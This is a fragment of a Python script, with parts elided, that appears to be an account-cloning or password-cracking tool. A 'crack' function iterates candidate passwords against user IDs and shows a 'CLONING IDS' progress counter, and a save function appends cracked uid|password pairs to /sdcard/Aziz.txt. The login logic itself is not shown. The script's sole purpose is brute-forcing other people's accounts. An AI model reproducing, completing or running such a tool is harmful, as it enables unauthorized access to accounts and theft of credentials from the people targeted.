...
def save_to_file(uid, pw):
    try:
        with open("/sdcard/Aziz.txt", "a") as f:
            f.write(f"{uid}|{pw}\n")
...
def main():
    clear()
    console.print(logo)
    console.print(Panel("Code: 017~018~019~016", style="bold green1"))
...
def crack(uid,pwx):
    ...
    try:
        for pw in pwx:
            sys.stdout.write(f'\r{w}[{b}➤{w}] {y}CLONING IDS {w}[{g}{loop}{w}]<>[CATX_OK:{g}{live}{w}]\r')
            sys.stdout.flush()
